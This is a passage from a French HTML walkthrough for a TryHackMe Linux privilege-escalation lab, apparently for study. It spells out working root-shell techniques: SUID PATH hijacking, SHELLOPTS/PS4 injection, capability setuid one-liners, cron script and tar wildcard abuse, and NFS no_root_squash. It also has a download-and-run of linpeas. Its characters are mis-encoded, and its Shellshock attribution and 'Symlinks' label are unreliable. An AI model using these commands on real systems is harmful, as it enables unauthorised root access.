# libcalc.so => not found</code></pre>
            </div>
            
            <div class="success-box">
                <strong>‚úÖ R√©ponse</strong><br>
                Shell root obtenu via injection de biblioth√®que partag√©e
            </div>
        </section>

        <!-- Task 12 -->
        <section class="task" id="task-12">
            <h2>Task 12 - SUID (Symlinks)<span class="difficulty diff-medium">Moyen</span></h2>
            
            <h3>üéØ Objectif</h3>
            <p>Exploiter un binaire SUID qui suit les liens symboliques de mani√®re non s√©curis√©e.</p>
            
            <h3>üìù Commandes</h3>
            <pre><code># 1. Identifier les binaires SUID
find / -type f -perm -04000 -ls 2>/dev/null

# 2. Trouver le binaire vuln√©rable (exemple: /usr/local/bin/suid-env)
ls -la /usr/local/bin/suid-env

# 3. Analyser le binaire avec strings
strings /usr/local/bin/suid-env

# Chercher des appels √† des commandes sans chemin absolu:
# service apache2 start

# 4. M√âTHODE 1 - PATH HIJACKING
# Cr√©er un script malveillant
echo '/bin/bash -p' > /tmp/service
chmod +x /tmp/service

# Modifier le PATH
export PATH=/tmp:$PATH

# Ex√©cuter le binaire SUID
/usr/local/bin/suid-env

# 5. V√©rifier root
id
whoami

# 6. Lire le flag
cat /root/flag.txt</code></pre>
            
            <div class="info-box">
                <h4>üîç Types de vuln√©rabilit√©s symlink</h4>
                <p><strong>1. PATH Hijacking :</strong></p>
                <pre><code># Le binaire appelle: service apache2 start
# Sans chemin absolu

# Cr√©er un faux service
echo '#!/bin/bash
/bin/bash -p' > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH</code></pre>
                
                <p><strong>2. Relative Path :</strong></p>
                <pre><code># Le binaire utilise: ./script.sh

# Cr√©er un faux script
echo '#!/bin/bash
/bin/bash -p' > script.sh
chmod +x script.sh</code></pre>
            </div>
            
            <div class="success-box">
                <strong>‚úÖ R√©ponse</strong><br>
                Shell root obtenu via exploitation de symlink/PATH
            </div>
        </section>

        <!-- Task 13 -->
        <section class="task" id="task-13">
            <h2>Task 13 - SUID (Environment Variables #1)<span class="difficulty diff-medium">Moyen</span></h2>
            
            <h3>üéØ Objectif</h3>
            <p>Exploiter un binaire SUID qui utilise des chemins relatifs pour appeler d'autres programmes.</p>
            
            <h3>üìù Commandes</h3>
            <pre><code># 1. Trouver le binaire SUID vuln√©rable
find / -type f -perm -04000 -ls 2>/dev/null
ls -la /usr/local/bin/suid-env

# 2. Analyser le binaire avec strings
strings /usr/local/bin/suid-env

# Sortie typique:
# service apache2 start
# (appelle "service" sans chemin absolu)

# 3. Cr√©er un faux "service" malveillant
cat > /tmp/service << EOF
#!/bin/bash
/bin/bash -p
EOF

# 4. Rendre le script ex√©cutable
chmod +x /tmp/service

# 5. Modifier le PATH pour inclure /tmp en premier
export PATH=/tmp:$PATH

# 6. V√©rifier le PATH
echo $PATH

# 7. Ex√©cuter le binaire SUID
/usr/local/bin/suid-env

# 8. Vous devriez avoir un shell root
id
whoami

# 9. Lire le flag
cat /root/flag.txt</code></pre>
            
            <div class="info-box">
                <h4>üîç Analyse d√©taill√©e</h4>
                <p><strong>V√©rifier les appels de programmes :</strong></p>
                <pre><code># Avec ltrace
ltrace /usr/local/bin/suid-env 2>&1 | grep system

# Avec strace
strace -f /usr/local/bin/suid-env 2>&1 | grep execve</code></pre>
            </div>
            
            <div class="success-box">
                <strong>‚úÖ R√©ponse</strong><br>
                Shell root obtenu via manipulation du PATH
            </div>
        </section>

        <!-- Task 14 -->
        <section class="task" id="task-14">
            <h2>Task 14 - SUID (Environment Variables #2)<span class="difficulty diff-hard">Difficile</span></h2>
            
            <h3>üéØ Objectif</h3>
            <p>Exploiter un binaire SUID qui utilise des chemins absolus mais peut √™tre tromp√© via la fonction bash.</p>
            
            <h3>üìù Commandes</h3>
            <pre><code># 1. Trouver le binaire SUID
ls -la /usr/local/bin/suid-env2

# 2. Analyser avec strings
strings /usr/local/bin/suid-env2

# Sortie:
# /usr/sbin/service apache2 start
# (Cette fois c'est un chemin absolu!)

# 3. M√âTHODE 1 - Bash Function Exploit (bash < 4.2-048)
# Cr√©er une fonction bash avec le nom du chemin complet
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service

# 4. Ex√©cuter le binaire
/usr/local/bin/suid-env2

# 5. M√âTHODE 2 - Bash Shell Options (bash < 4.4)
# Utiliser la variable ENV
echo '/bin/bash -p' > /tmp/shell.sh
chmod +x /tmp/shell.sh
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash)' /usr/local/bin/suid-env2

# Puis ex√©cuter le bash SUID cr√©√©
/tmp/rootbash -p

# 6. V√©rifier que vous √™tes root
id
whoami

# 7. Lire le flag
cat /root/flag.txt</code></pre>
            
            <div class="info-box">
                <h4>üîç Explication des m√©thodes</h4>
                <p><strong>1. Bash Function Export (CVE-2014-6271 - Shellshock) :</strong></p>
                <pre><code># Bash < 4.2-048 permet d'exporter des fonctions
# qui peuvent remplacer des commandes syst√®me

function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service</code></pre>
                
                <p><strong>2. SHELLOPTS + PS4 :</strong></p>
                <pre><code># SHELLOPTS=xtrace active le mode debug
# PS4 d√©finit le prompt de debug qui est ex√©cut√©

env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash)' /usr/local/bin/suid-env2</code></pre>
            </div>
            
            <div class="success-box">
                <strong>‚úÖ R√©ponse</strong><br>
                Shell root obtenu via exploitation de fonctions bash
            </div>
        </section>

        <!-- Task 15 -->
        <section class="task" id="task-15">
            <h2>Task 15 - Capabilities<span class="difficulty diff-hard">Difficile</span></h2>
            
            <h3>üéØ Objectif</h3>
            <p>Exploiter les capabilities Linux pour l'escalade de privil√®ges.</p>
            
            <h3>üìù Commandes</h3>
            <pre><code># 1. Lister tous les binaires avec capabilities
getcap -r / 2>/dev/null

# Sortie typique:
# /usr/bin/python2.7 = cap_setuid+ep
# /usr/bin/vim = cap_setuid+ep
# /usr/bin/perl = cap_setuid+ep

# 2. M√âTHODE PYTHON avec cap_setuid
# Si Python a cap_setuid+ep
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Ou Python3
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# 3. M√âTHODE VIM avec cap_setuid
# Si Vim a cap_setuid+ep
/usr/bin/vim -c ':py3 import os; os.setuid(0); os.execl("/bin/bash", "bash", "-c", "reset; exec bash")'

# 4. M√âTHODE PERL avec cap_setuid
# Si Perl a cap_setuid+ep
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'

# 5. M√âTHODE NODE avec cap_setuid
# Si node a cap_setuid+ep
/usr/bin/node -e 'process.setuid(0); require("child_process").spawn("/bin/bash", {stdio: [0, 1, 2]})'

# 6. M√âTHODE RUBY avec cap_setuid
# Si ruby a cap_setuid+ep
/usr/bin/ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'

# 7. V√©rifier que vous √™tes root
id
whoami

# 8. Lire le flag
cat /root/flag.txt</code></pre>
            
            <div class="info-box">
                <h4>üîç Capabilities Linux expliqu√©es</h4>
                <table>
                    <thead>
                        <tr>
                            <th>Capability</th>
                            <th>Description</th>
                            <th>Exploitation</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td>cap_setuid</td>
                            <td>Changer l'UID</td>
                            <td>Devenir root</td>
                        </tr>
                        <tr>
                            <td>cap_setgid</td>
                            <td>Changer le GID</td>
                            <td>Acc√®s groupe root</td>
                        </tr>
                        <tr>
                            <td>cap_dac_read_search</td>
                            <td>Bypass lecture fichiers</td>
                            <td>Lire /etc/shadow</td>
                        </tr>
                        <tr>
                            <td>cap_dac_override</td>
                            <td>Bypass permissions</td>
                            <td>Modifier fichiers prot√©g√©s</td>
                        </tr>
                        <tr>
                            <td>cap_chown</td>
                            <td>Changer propri√©taire</td>
                            <td>Prendre contr√¥le fichiers</td>
                        </tr>
                    </tbody>
                </table>
            </div>
            
            <div class="success-box">
                <strong>‚úÖ R√©ponse</strong><br>
                Shell root obtenu via exploitation de capabilities
            </div>
        </section>

        <!-- Task 16 -->
        <section class="task" id="task-16">
            <h2>Task 16 - Cron (Path)<span class="difficulty diff-medium">Moyen</span></h2>
            
            <h3>üéØ Objectif</h3>
            <p>Exploiter une t√¢che cron qui utilise des chemins relatifs.</p>
            
            <h3>üìù Commandes</h3>
            <pre><code># 1. Lister les cron jobs
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/

# 2. V√©rifier les crons syst√®me
cat /etc/crontab

# Exemple de sortie vuln√©rable:
# * * * * * root overwrite.sh
# (Pas de chemin absolu!)

# PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# 3. Identifier le PATH utilis√© par cron
cat /etc/crontab | grep PATH

# 4. Cr√©er un script malveillant dans un dossier du PATH accessible en √©criture
# Si /usr/local/bin est accessible en √©criture
cat > /usr/local/bin/overwrite.sh << EOF
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
EOF

# 5. Rendre le script ex√©cutable
chmod +x /usr/local/bin/overwrite.sh

# 6. Attendre que le cron s'ex√©cute (max 1 minute si * * * * *)
# V√©rifier si le fichier est cr√©√©
ls -la /tmp/rootbash

# 7. Une fois cr√©√©, ex√©cuter le bash SUID
/tmp/rootbash -p

# 8. V√©rifier que vous √™tes root
id
whoami

# 9. Lire le flag
cat /root/flag.txt</code></pre>
            
            <div class="info-box">
                <h4>üîç Analyse des cron jobs</h4>
                <p><strong>Fichiers √† v√©rifier :</strong></p>
                <pre><code>/etc/crontab              # Cron syst√®me principal
/etc/cron.d/*             # Cron jobs additionnels
/etc/cron.daily/*         # Scripts quotidiens
/etc/cron.hourly/*        # Scripts horaires
/etc/cron.weekly/*        # Scripts hebdomadaires
/etc/cron.monthly/*       # Scripts mensuels
/var/spool/cron/crontabs/* # Cron utilisateurs</code></pre>
                
                <p><strong>Format d'une ligne crontab :</strong></p>
                <pre><code>* * * * * user command
‚îÇ ‚îÇ ‚îÇ ‚îÇ ‚îÇ
‚îÇ ‚îÇ ‚îÇ ‚îÇ ‚îî‚îÄ‚îÄ‚îÄ Jour de la semaine (0-7)
‚îÇ ‚îÇ ‚îÇ ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ Mois (1-12)
‚îÇ ‚îÇ ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ Jour du mois (1-31)
‚îÇ ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ Heure (0-23)
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ Minute (0-59)</code></pre>
            </div>
            
            <div class="success-box">
                <strong>‚úÖ R√©ponse</strong><br>
                Shell root obtenu via exploitation de PATH dans cron
            </div>
        </section>

        <!-- Task 17 -->
        <section class="task" id="task-17">
            <h2>Task 17 - Cron (Wildcards)<span class="difficulty diff-hard">Tr√®s Difficile</span></h2>
            
            <h3>üéØ Objectif</h3>
            <p>Exploiter l'utilisation dangereuse de wildcards dans les scripts cron.</p>
            
            <h3>üìù Commandes</h3>
            <pre><code># 1. Examiner le crontab
cat /etc/crontab

# Exemple de ligne vuln√©rable:
# * * * * * root /usr/local/bin/compress.sh

# 2. V√©rifier le contenu du script
cat /usr/local/bin/compress.sh

# Script vuln√©rable typique:
#!/bin/bash
cd /home/user
tar czf /tmp/backup.tar.gz *

# Le "*" est dangereux!

# 3. EXPLOITATION TAR avec wildcards
# Cr√©er des fichiers sp√©ciaux qui seront interpr√©t√©s comme des options

cd /home/user

# Cr√©er un script malveillant
cat > shell.sh << EOF
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
EOF

chmod +x shell.sh

# 4. Cr√©er les fichiers "options" pour tar
# --checkpoint=1 : Ex√©cute une action √† chaque fichier
# --checkpoint-action=exec=shell.sh : Ex√©cute notre script

touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.sh

# 5. Attendre que le cron s'ex√©cute
# V√©rifier si rootbash est cr√©√©
ls -la /tmp/rootbash

# 6. Ex√©cuter le bash SUID
/tmp/rootbash -p

# 7. V√©rifier que vous √™tes root
id
whoami

# 8. Lire le flag
cat /root/flag.txt</code></pre>
            
            <div class="warning-box">
                <h4>üîç Explication de l'exploitation</h4>
                <p><strong>Pourquoi c'est vuln√©rable :</strong></p>
                <p>Le script ex√©cute :</p>
                <pre><code>tar czf /tmp/backup.tar.gz *</code></pre>
                <p>Le wildcard <code>*</code> est expans√© par le shell en liste de fichiers :</p>
                <pre><code>tar czf /tmp/backup.tar.gz file1 file2 --checkpoint=1 --checkpoint-action=exec=shell.sh file3</code></pre>
                <p>Tar interpr√®te <code>--checkpoint=1</code> et <code>--checkpoint-action=exec=shell.sh</code> comme des <strong>options</strong> et non des <strong>fichiers</strong> !</p>
            </div>
            
            <div class="success-box">
                <strong>‚úÖ R√©ponse</strong><br>
                Shell root obtenu via exploitation de wildcards dans tar
            </div>
        </section>

        <!-- Task 18 -->
        <section class="task" id="task-18">
            <h2>Task 18 - Cron (File Overwrite)<span class="difficulty diff-easy">Facile</span></h2>
            
            <h3>üéØ Objectif</h3>
            <p>Exploiter un script cron qui √©crase un fichier accessible en √©criture.</p>
            
            <h3>üìù Commandes</h3>
            <pre><code># 1. Examiner le crontab
cat /etc/crontab

# Exemple:
# * * * * * root overwrite.sh

# 2. Localiser et examiner le script
locate overwrite.sh
cat /usr/local/bin/overwrite.sh

# 3. V√©rifier les permissions du script
ls -la /usr/local/bin/overwrite.sh

# Si le script est accessible en √©criture:
# -rwxr-xrwx 1 root root ... overwrite.sh

# 4. M√âTHODE 1 - Remplacer le contenu du script
cat > /usr/local/bin/overwrite.sh << EOF
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
EOF

# 5. S'assurer que le script est ex√©cutable
chmod +x /usr/local/bin/overwrite.sh

# 6. Attendre l'ex√©cution du cron (max 1 minute)
watch -n 1 'ls -la /tmp/rootbash'

# 7. Ex√©cuter le bash SUID
/tmp/rootbash -p

# 8. V√©rifier que vous √™tes root
id
whoami

# 9. Lire le flag
cat /root/flag.txt</code></pre>
            
            <div class="info-box">
                <h4>üîç Scripts √† chercher</h4>
                <p><strong>Fichiers potentiellement modifiables :</strong></p>
                <pre><code># Scripts avec mauvaises permissions
find /usr/local/bin -writable -type f 2>/dev/null
find /etc/cron.* -writable -type f 2>/dev/null
find / -writable -name "*.sh" 2>/dev/null

# Scripts appartenant √† votre groupe
find / -group $(id -gn) -name "*.sh" 2>/dev/null</code></pre>
            </div>
            
            <div class="success-box">
                <strong>‚úÖ R√©ponse</strong><br>
                Shell root obtenu via modification de script cron
            </div>
        </section>

        <!-- Task 19 -->
        <section class="task" id="task-19">
            <h2>Task 19 - NFS Root Squashing<span class="difficulty diff-hard">Difficile</span></h2>
            
            <h3>üéØ Objectif</h3>
            <p>Exploiter un partage NFS mal configur√© sans root_squash pour cr√©er un binaire SUID.</p>
            
            <h3>üìù Commandes</h3>
            
            <h4>SUR LA MACHINE CIBLE (victim) :</h4>
            <pre><code># 1. V√©rifier les exports NFS
cat /etc/exports

# Exemple de configuration vuln√©rable:
# /tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)

# no_root_squash = le root sur le client reste root sur le serveur!

# 2. V√©rifier les partages mont√©s
showmount -e MACHINE_IP

# 3. Noter l'adresse IP de la machine
ip addr</code></pre>
            
            <h4>SUR VOTRE MACHINE D'ATTAQUE (AttackBox) :</h4>
            <pre><code># 4. V√©rifier les partages disponibles
showmount -e VICTIM_IP

# 5. Cr√©er un point de montage
mkdir -p /tmp/nfs_mount

# 6. Monter le partage NFS
mount -o rw VICTIM_IP:/tmp /tmp/nfs_mount

# 7. V√©rifier le montage
df -h | grep nfs

# 8. M√âTHODE 1 - Cr√©er un bash SUID
# Copier bash dans le partage NFS
cp /bin/bash /tmp/nfs_mount/rootbash

# Set le bit SUID (en tant que root sur votre machine)
chmod +s /tmp/nfs_mount/rootbash

# V√©rifier les permissions
ls -la /tmp/nfs_mount/rootbash
# -rwsr-sr-x ... rootbash</code></pre>
            
            <h4>RETOUR SUR LA MACHINE CIBLE (victim) :</h4>
            <pre><code># 9. V√©rifier que le fichier est cr√©√© avec SUID
ls -la /tmp/rootbash
# -rwsr-sr-x 1 root root ... rootbash

# 10. Ex√©cuter le bash SUID
/tmp/rootbash -p

# 11. V√©rifier que vous √™tes root
id
# uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) ...

whoami
# root

# 12. Lire le flag
cat /root/flag.txt</code></pre>
            
            <div class="warning-box">
                <h4>üîç Explication de l'attaque</h4>
                <p><strong>Root Squashing :</strong></p>
                <ul>
                    <li>Par d√©faut, NFS "squash" le root client en nobody/nfsnobody sur le serveur</li>
                    <li>Cela emp√™che un root client de manipuler les fichiers en tant que root sur le serveur</li>
                </ul>
                
                <p><strong>no_root_squash :</strong></p>
                <ul>
                    <li>D√©sactive cette protection</li>
                    <li>Le root sur le client reste root sur le serveur</li>
                    <li>Permet de cr√©er des fichiers SUID appartenant √† root</li>
                </ul>
                
                <p><strong>Processus d'exploitation :</strong></p>
                <ol>
                    <li>Identifiez un partage NFS avec <code>no_root_squash</code></li>
                    <li>Montez-le depuis une machine o√π vous √™tes root</li>
                    <li>Cr√©ez un binaire SUID sur le partage (vous √™tes root sur votre machine)</li>
                    <li>Le binaire appartient √† root sur le serveur NFS</li>
                    <li>Ex√©cutez-le sur le serveur pour obtenir un shell root</li>
                </ol>
            </div>
            
            <div class="info-box">
                <h4>üîç Options NFS importantes</h4>
                <table>
                    <thead>
                        <tr>
                            <th>Option</th>
                            <th>Description</th>
                            <th>S√©curit√©</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td>root_squash</td>
                            <td>Map root‚Üínobody</td>
                            <td>‚úÖ S√©curis√©</td>
                        </tr>
                        <tr>
                            <td>no_root_squash</td>
                            <td>Root reste root</td>
                            <td>‚ùå Dangereux</td>
                        </tr>
                        <tr>
                            <td>all_squash</td>
                            <td>Tous‚Üínobody</td>
                            <td>‚úÖ Tr√®s s√©curis√©</td>
                        </tr>
                        <tr>
                            <td>sync</td>
                            <td>√âcritures synchrones</td>
                            <td>‚úÖ Recommand√©</td>
                        </tr>
                    </tbody>
                </table>
            </div>
            
            <div class="success-box">
                <strong>‚úÖ R√©ponse</strong><br>
                Shell root obtenu via exploitation de NFS no_root_squash
            </div>
        </section>

        <!-- Summary Section -->
        <section class="task">
            <h2>üìù R√©sum√© des techniques</h2>
            <table>
                <thead>
                    <tr>
                        <th>Task</th>
                        <th>Technique</th>
                        <th>Commande cl√©</th>
                        <th>Difficult√©</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td>3</td>
                        <td>Kernel Exploit</td>
                        <td><code>./dirty</code></td>
                        <td>‚≠ê‚≠ê‚≠ê</td>
                    </tr>
                    <tr>
                        <td>4</td>
                        <td>Config Files</td>
                        <td><code>grep -r "password"</code></td>
                        <td>‚≠ê</td>
                    </tr>
                    <tr>
                        <td>5</td>
                        <td>History</td>
                        <td><code>cat ~/.bash_history</code></td>
                        <td>‚≠ê</td>
                    </tr>
                    <tr>
                        <td>6</td>
                        <td>Weak Permissions</td>
                        <td><code>ls -la /etc/shadow</code></td>
                        <td>‚≠ê‚≠ê</td>
                    </tr>
                    <tr>
                        <td>7</td>
                        <td>SSH Keys</td>
                        <td><code>find / -name id_rsa</code></td>
                        <td>‚≠ê‚≠ê</td>
                    </tr>
                    <tr>
                        <td>8</td>
                        <td>Sudo Shell Escape</td>
                        <td><code>sudo vim -c ':!/bin/bash'</code></td>
                        <td>‚≠ê‚≠ê</td>
                    </tr>
                    <tr>
                        <td>9</td>
                        <td>Sudo Abuse</td>
                        <td><code>sudo apache2 -f /etc/shadow</code></td>
                        <td>‚≠ê‚≠ê‚≠ê</td>
                    </tr>
                    <tr>
                        <td>10</td>
                        <td>LD_PRELOAD</td>
                        <td><code>sudo LD_PRELOAD=/tmp/shell.so</code></td>
                        <td>‚≠ê‚≠ê‚≠ê</td>
                    </tr>
                    <tr>
                        <td>11</td>
                        <td>SUID SO Injection</td>
                        <td><code>strace + .so malveillante</code></td>
                        <td>‚≠ê‚≠ê‚≠ê‚≠ê</td>
                    </tr>
                    <tr>
                        <td>12</td>
                        <td>SUID Symlinks</td>
                        <td><code>export PATH=/tmp:$PATH</code></td>
                        <td>‚≠ê‚≠ê</td>
                    </tr>
                    <tr>
                        <td>13</td>
                        <td>SUID Env Var #1</td>
                        <td><code>export PATH=/tmp:$PATH</code></td>
                        <td>‚≠ê‚≠ê</td>
                    </tr>
                    <tr>
                        <td>14</td>
                        <td>SUID Env Var #2</td>
                        <td><code>function /usr/sbin/service</code></td>
                        <td>‚≠ê‚≠ê‚≠ê</td>
                    </tr>
                    <tr>
                        <td>15</td>
                        <td>Capabilities</td>
                        <td><code>getcap -r /</code></td>
                        <td>‚≠ê‚≠ê‚≠ê</td>
                    </tr>
                    <tr>
                        <td>16</td>
                        <td>Cron Path</td>
                        <td>Modifier PATH + attendre cron</td>
                        <td>‚≠ê‚≠ê</td>
                    </tr>
                    <tr>
                        <td>17</td>
                        <td>Cron Wildcards</td>
                        <td><code>touch -- --checkpoint=1</code></td>
                        <td>‚≠ê‚≠ê‚≠ê‚≠ê</td>
                    </tr>
                    <tr>
                        <td>18</td>
                        <td>Cron Overwrite</td>
                        <td>Modifier script cron</td>
                        <td>‚≠ê</td>
                    </tr>
                    <tr>
                        <td>19</td>
                        <td>NFS no_root_squash</td>
                        <td>Monter NFS + cr√©er SUID</td>
                        <td>‚≠ê‚≠ê‚≠ê</td>
                    </tr>
                </tbody>
            </table>
        </section>

        <!-- Tips Section -->
        <section class="task">
            <h2>üéØ Conseils g√©n√©raux</h2>
            
            <h3>1. Toujours commencer par l'√©num√©ration</h3>
            <pre><code>sudo -l
find / -perm -4000 2>/dev/null
cat /etc/crontab
getcap -r / 2>/dev/null</code></pre>
            
            <h3>2. Utiliser GTFOBins</h3>
            <p>R√©f√©rence essentielle : <a href="https://gtfobins.github.io/" style="color: var(--accent-1);">https://gtfobins.github.io/</a></p>
            
            <h3>3. Automatiser avec LinPEAS</h3>
            <pre><code>wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh</code></pre>
            
            <h3>4. V√©rifier les permissions</h3>
            <p>Toujours v√©rifier les permissions avant de modifier des fichiers</p>
            
            <h3>5. Documenter vos findings</h3>
            <p>Documenter vos findings au fur et √† mesure</p>
        </section>
    </main>

    <footer>
        <p><strong>Bon courage pour la room ! üöÄ</strong></p>
        <p>Guide cr√©√© pour TryHackMe - Linux PrivEsc Arena</p>
    </footer>

    <div class="scroll-top" onclick="window.scrollTo({top: 0, behavior: 'smooth'})">‚Üë</div>

    <script>
        // Show/hide scroll to top button
        window.addEventListener('scroll', function() {
            const scrollTop = document.querySelector('.scroll-top');
            if (window.pageYOffset > 300) {
                scrollTop.classList.add('visible');
            } else {
                scrollTop.classList.remove('visible');
            }
        });

        // Smooth scroll for navigation links
        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
            anchor.addEventListener('click', function (e) {
                e.preventDefault();
                const target = document.querySelector(this.getAttribute('href'));
                if (target) {
                    target.scrollIntoView({
                        behavior: 'smooth',
                        block: 'start'
                    });
                }
            });
        });
    </script>
</body>
</html>